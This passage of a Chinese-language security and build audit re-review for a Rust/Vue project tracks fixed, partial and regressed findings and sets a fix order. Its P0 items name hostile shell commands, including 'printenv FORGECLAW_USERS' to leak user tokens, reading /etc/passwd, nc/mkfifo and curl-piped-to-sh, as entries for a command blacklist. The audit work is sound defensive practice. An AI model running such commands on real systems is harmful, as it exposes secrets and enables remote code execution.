FIXED: 16 / PARTIAL: 5 / NOT-FIXED: 3（前提错误，实际 N/A）/ REGRESSED: 0 / NEW: 6

---

## 视角 F — CI/CD 与构建配置重新审计

### 首轮发现状态标注

- **F-001** [PARTIAL] P0 | `crates/server/src/lib.rs:37,46-48,95-126,165` + `Cargo.toml:26` | rust-embed 集成代码完整：`#[derive(RustEmbed)] #[folder = "../../web/dist"]` + `static_handler` SPA fallback（含 `/api/`、`/ws/` 前缀保护）+ `.fallback(static_handler)`。**残留**：`web/dist` 目录被 `.gitignore` 忽略且本地不存在，rust-embed 编译期读取失败，**本地 `cargo check/clippy/test` 全部失败**（实测 3 errors）。CI 靠 artifact 传递规避。
- **F-002** [FIXED] P0 | `.github/workflows/ci.yml:47-65` | CI 构建顺序修复：rust job `needs: frontend`；frontend job `upload-artifact@v7` 上传 `web/dist`；rust job `download-artifact@v5` 拉回。
- **F-003** [FIXED] P1 | `.github/workflows/release.yml:44-47` | 矩阵追加 `aarch64-pc-windows-msvc`，达 6 组合。
- **F-004** [FIXED] P1 | `ci.yml:11-13,18,56` + `release.yml:11-13,19` | concurrency（ci cancel-in-progress:true, release:false）+ timeout-minutes（ci 20, release 30）。
- **F-005** [FIXED] P1 | `ci.yml:8-9` | ci.yml 顶层 `permissions: contents: read`。
- **F-006** [NOT-FIXED] P1 | `release.yml:8-9` | `permissions: contents: write` 仍在工作流顶层未下移到 job 级。虽仅一个 job，但最小权限原则未落实。
- **F-007** [NOT-FIXED] P2 | `Cargo.toml:26` | `tokio features = ["full"]` 未收窄，所有 crate 通过 `workspace = true` 无法按 crate 裁剪。
- **F-008** [NOT-FIXED 残留] P2 | `release.yml:110-116` | Windows job 产物列表冗余 `.tar.gz` 行（Windows 只产 `.zip`）。修复方向：step-level 条件或拆 upload step。
- **F-009** [FIXED] P2 | `.github/workflows/ci.yml` + `release.yml` | `pnpm/action-setup` 已升级至 `@v6`（首轮担忧的 v5 vs spec @v4 不一致已消解，v6 基于 node24 运行时，可用且合规）。
- **F-010** [NOT-FIXED 残留] P2 | `web/package.json:8,10` | `vue-tsc` 在 build 与 typecheck 重复执行。修复方向：build 改纯 `vite build`。
- **F-011** [NOT-FIXED 残留] P2 | `release.yml:78` | rust-cache key 仅 `${{ matrix.target }}` 不含 OS（实际 target 已唯一不会冲突）。修复方向：`key: ${{ matrix.os }}-${{ matrix.target }}`。

### 构建验证

- **cargo check 结果**：**失败**（3 errors, 0 warnings）。根因：`web/dist` 目录不存在（`.gitignore` 忽略），rust-embed 编译期读取失败。
- **rust-embed folder 与 vite outDir 一致性**：**一致** ✓（`#[folder = "../../web/dist"]` ↔ vite 默认 `dist`）。
- **tsconfig strict 配置**：未显式声明（extends `@vue/tsconfig/tsconfig.dom.json`，TS 6.0 默认 strict）。
- **actions 版本**：全部对齐 node24 运行时（优于 node22 约束）：checkout@v7、setup-node@v6、upload-artifact@v7、download-artifact@v5、pnpm/action-setup@v6、softprops/action-gh-release@v3、Swatinem/rust-cache@v2。`node-version: 22` 是构建前端的 LTS 版本。

### NEW 发现

- **F-NEW-001** [P0] `crates/server/src/lib.rs:46-48` + `web/.gitignore:11` | **本地 cargo check/clippy/test 全部失败**。rust-embed 编译期读取 `web/dist`，该目录被 `.gitignore` 忽略，本地未先 `pnpm build` 时 rust workspace 不可编译。新贡献者克隆仓库后 `cargo test` 直接红，rust-analyzer 无法索引 server crate。修复方向：① `web/dist/.gitkeep` 占位 + `.gitignore` 改 `dist/*` + `!dist/.gitkeep`；或 ② `crates/server/build.rs` 在 dist 不存在时创建空目录；或 ③ 改用 `include_dir` + cfg_attr 条件编译。
- **F-NEW-002** [P1] `.github/workflows/release.yml:8-9` | release.yml `permissions: contents: write` 仍写在工作流顶层（= F-006 残留，非新问题但未修复）。修复方向：删除顶层 permissions，在 build job 内声明。
- **F-NEW-003** [P2] `release.yml:110-116` | Windows job 产物列表冗余 `.tar.gz`（= F-008 残留）。修复方向：step-level 条件。
- **F-NEW-004** [P2] `web/package.json:8,10` | `vue-tsc` 重复执行（= F-010 残留）。修复方向：build 改纯 `vite build`。
- **F-NEW-005** [P2] `release.yml:78` | rust-cache key 不含 OS（= F-011 残留）。修复方向：`key: ${{ matrix.os }}-${{ matrix.target }}`。

### 视角 F 汇总
FIXED: 5 / PARTIAL: 1 / NOT-FIXED: 2（+3 残留）/ REGRESSED: 0 / NEW: 5（1 真新 + 4 残留折射）

---

## 合并回归专项小节（聚焦 `be8ac66` 的回退与删除）

### 1. `model.rs` 回退（A-002 REGRESSED）

- **现象**：`crates/core/src/model.rs:17` 仍为 `pub messages: Vec<Message>`，首轮 A-002 修复（改私有 + 访问器）被撤销。
- **回归原因**：`be8ac66` 提交说明 "Revert model.rs to main's version (keep messages public)"。
- **影响评估**：**有限**。核心 append-only 已由 `History`（llm/src/lib.rs 私有字段 + `Arc<RwLock>`）类型层面守护，`SessionData.history` 改 `Arc<RwLock<History>>` 后并发覆盖已解决（B-001 FIXED）。`Session.messages` 的 `pub` 主要影响类型层面纪律与双份存储风险，不构成数据损坏。
- **建议**：P1 修复，改私有 + 访问器，与 `History` 设计统一。

### 2. `Cargo.toml` / `tsconfig.app.json` 回退

- **现象**：`be8ac66` 回退了根 `Cargo.toml`、`web/tsconfig.app.json` 到 main 版本。
- **影响评估**：A-006 依赖清理（tracing/forgeclaw-core 未用）未受影响（已通过其他方式解决）。tsconfig strict 未显式声明（E-019 PARTIAL），但 extends 基座 + TS 6.0 默认 strict:true，功能上 strict 生效。**无阻断影响**。
- **建议**：P2，tsconfig 显式声明 strict 提升可读性。

### 3. 被删 3 个 orchestrator 测试

- **现象**：`be8ac66` 删除 `run_streaming_stops_when_receiver_dropped`、`run_once_propagates_llm_stream_error`、`run_once_invalid_tool_arguments_returns_tool_result_error`。
- **影响评估**：
  - `run_streaming_stops_when_receiver_dropped`（D-006/B-003 客户端断连停止）：**无替代，高风险**。实现有 `tx.send().is_err()` 检查但无测试守护。
  - `run_once_propagates_llm_stream_error`（D-004 LLM Error 传播）：**部分替代，低风险**。`run_once_llm_error_does_not_modify_history` 守护核心路径但不验证 message 内容。
  - `run_once_invalid_tool_arguments_returns_tool_result_error`（D-012 非法 JSON 回填）：**无替代，高风险**。`parse_tool_input` 的 `Err` 分支完全无测试覆盖。
- **被删原因**：测试期望与当前实现契约不一致（返回类型、消息文案）。
- **建议**：P1，重写这 3 个测试对齐当前契约，恢复回归防护。

### 4. `PromptsView.vue` 重写

- **现象**：因 naive-ui 被移除，PromptsView 重写为纯原生 HTML。
- **影响评估**：**未引入 XSS**（无 v-html），不依赖 naive-ui。但**丢失保存功能**（编辑器改动导航后丢失）+ 无 Markdown 预览 + CSS token 错引（`--mono` 应为 `--font-mono`）。属功能缩水而非回归。
- **建议**：P2，补保存端点调用与 Markdown 预览。

### 5. ticket API 引入的回归检测

- **现象**：新增 `/api/auth/ticket` 端点 + 前端 ticket 流。
- **影响评估**：ticket 实现正确（`Uuid::new_v4()` 122 bit 熵 + 用后即焚 + 60s TTL + 绑定 user_id + TraceLayer 脱敏）。**无合并回归**。新引入 3 条轻微问题：C-NEW-001（过期 ticket 不清理 + 无限流）、C-NEW-002（ticket 走 query，代理日志风险）、B-NEW-002/B-NEW-003/D-NEW-002（tickets HashMap 无清理 + Mutex poison panic），均为 P2。
- **建议**：P2，sweep 过期 ticket + 处理 Mutex poison。

---

## 仍需修复的问题清单（NOT-FIXED + PARTIAL + REGRESSED + NEW）

### P0（4 条）

| 编号 | 状态 | 位置 | 问题 | 修复方向 |
|------|------|------|------|----------|
| C-004 | NOT-FIXED | `crates/tools/src/shell.rs:140-148` | ShellTool 子进程继承全部环境变量，`printenv FORGECLAW_USERS` 泄漏全部用户 token | `Command::new("sh").env_clear()` 后仅注入 allowlist（PATH、HOME） |
| C-005 | NOT-FIXED | `crates/tools/src/shell.rs` + `sandbox.rs` | 无 landlock/seccomp 真沙箱，可 `cd /` 读写任意文件 | Linux 引入 `landlock` crate 限制 FS 访问至 working_dir |
| C-001 | PARTIAL | `crates/tools/src/shell.rs:38-64` | 黑名单仍缺 sudo/su/chown/cat /etc/passwd/env/nc/mkfifo/curl\|sh 等 | 补全黑名单或改白名单策略 |
| F-001/F-NEW-001 | PARTIAL+NEW | `crates/server/src/lib.rs:46-48` + `web/.gitignore` | 本地 cargo check 失败（web/dist 不存在） | `web/dist/.gitkeep` + `.gitignore` 调整，或 `build.rs` 创建空目录 |

### P1（12 条）

| 编号 | 状态 | 位置 | 问题 |
|------|------|------|------|
| A-002 | REGRESSED | `crates/core/src/model.rs:17` | `Session.messages` 重新 pub（model.rs 回退） |
| B-003 | PARTIAL | `ws.rs:230,109-136` | WS 超时/SESSION_TIMEOUT 后未 `join.abort()`，任务后台持锁烧 token |
| B-004 | NOT-FIXED | `orchestrator.rs:80` + `engine.rs` | PromptEngine `tokio::Mutex` + 同步阻塞文件 IO |
| B-NEW-001 | NEW | `api.rs:172-181` + `ws.rs:172-188` | 新建 session 并发竞态（各自创建独立 history_arc） |
| C-010 | PARTIAL | `auth.rs:99-101` | `find_by_token` 用 `HashMap::get` 非常量时间，泄漏 token 存在性 |
| C-015 | NOT-FIXED | `crates/tools/src/file.rs:213-241` | FileWriteTool `is_within` 与 `fs::write` 间 TOCTOU |
| C-016 | PARTIAL | `auth.rs:23` | `User` 仍 `#[derive(Debug)]`，tracing 打印 token |
| C-017 | NOT-FIXED | `orchestrator.rs:537,565` | `auto_confirm()` 自动放行所有 Confirm 级工具 |
| D-009 | PARTIAL | `ws.rs:285-290` | WS Error 消息直传前端，可能含上游 API 细节 |
| D-011/D-NEW-001 | PARTIAL+NEW | `ws.rs:230` | timeout 后不 `abort()`，detach 任务持 history 写锁阻塞同 session |
| E-005 | PARTIAL | `web/src/api/client.ts` | API 客户端无重试 |
| E-NEW-001 | NEW | `web/src/views/ChatView.vue:142-156` | tool_result 按 name 匹配，并发同名工具错配 |
| 被删测试 | REGRESSED | `crates/server/tests/orchestrator_test.rs` | 2 个高风险测试无替代守护（D-006/D-012 路径） |

### P2（26+ 条）

A-007、A-008、A-010、A-012、A-016、A-018、A-NEW-001、A-NEW-002、B-007、B-008、B-009、B-010、B-011、B-013、B-014、B-NEW-002、B-NEW-003、C-018、C-019、C-020、C-021、C-022、C-NEW-001、C-NEW-002、C-NEW-003、D-015、D-016、D-018、D-019、D-NEW-002、E-009、E-010、E-019、E-023、E-NEW-002、E-NEW-003、E-NEW-004、E-NEW-005、E-NEW-006、F-006/F-NEW-002、F-007、F-008/F-NEW-003、F-010/F-NEW-004、F-011/F-NEW-005

---

## 推荐下一轮修复顺序

### 阶段 1：阻断性 P0（4 条，最高优先）

1. **C-004** env_clear：ShellTool 清理敏感环境变量（独立，可并行）
2. **C-001** 黑名单补全：补 sudo/su/chown/cat /etc/passwd/env/nc/mkfifo/curl|sh 等（独立）
3. **C-005** landlock 沙箱：Linux 引入 landlock（独立，长期任务）
4. **F-001/F-NEW-001** 本地编译修复：`web/dist/.gitkeep` + `.gitignore` 调整（独立，最小改动）

### 阶段 2：合并回归与并发 P1（6 条）

5. **A-002** `Session.messages` 改私有 + 访问器（独立）
6. **B-NEW-001** 新建 session 并发竞态：`entry().or_insert_with()` 原子取或建（影响 D-NEW-001）
7. **D-011/D-NEW-001** WS timeout 后 `join.abort()`：改 `tokio::select!` 保留 JoinHandle（与 B-003 联动）
8. **B-003** WS 断连 abort：同上联动修复
9. **被删测试** 重写 3 个测试对齐当前契约，恢复 D-006/D-012 路径守护（独立）
10. **C-017** 去除 `auto_confirm()`，Confirm 级工具需显式确认（独立）

### 阶段 3：安全加固 P1（5 条）

11. **C-015** FileWriteTool TOCTOU：canonicalize 后直接写规范化路径（独立）
12. **C-016/C-019** User Debug 手写掩盖 token + `secrecy::Secret`（独立）
13. **C-010/C-020** `find_by_token` 改常量时间查找（独立）
14. **D-009** WS Error 消息脱敏：直传通用文案，细节落 tracing（独立）
15. **B-004** PromptEngine 拆 `RwLock` + `tokio::fs` 锁外读取（独立）

### 阶段 4：前端 P1（2 条）

16. **E-005** API 客户端加超时重试（独立）
17. **E-NEW-001** 后端事件增加 `call_id` + 前端精确匹配（影响前后端，需协调）

### 阶段 5：P2 长尾（22+ 条，滚动迭代）

按视角分批处理：类型安全（A-007/A-008/A-018）、缓存与性能（B-007/B-008/A-010）、跨平台（C-018/C-021）、测试覆盖（D-014/D-015）、前端体验（E-009/E-010/E-NEW-002~006）、CI 加固（F-006/F-007/F-008/F-010/F-011）、ticket 清理（B-NEW-002/B-NEW-003/C-NEW-001/D-NEW-002）。

---

## 附录：首轮对比

| 指标 | 首轮（2026-07-05） | 本轮（2026-07-11） | 变化 |
|------|-------------------|-------------------|------|
| P0 总数 | 24 | 4（+1 新） | -20 |
| P1 总数 | 34 | 12（+4 新） | -22 |
| P2 总数 | 51 | 26+（+16 新） | -25 |
| WebUI 可用性 | 不可用 | 基本可用 | ✅ |
| 并发 append-only | 破坏 | 守护（Arc<RwLock>） | ✅ |
| 编排器死循环 | 是 | 否（max_turns=25） | ✅ |
| WS 鉴权 | query token 可复用 | 一次性 ticket | ✅ |
| 本地编译 | 通过 | 失败（web/dist 缺失） | ❌ |
| 最高危残留 | 24 P0 | C-004 env_clear | 收窄 |
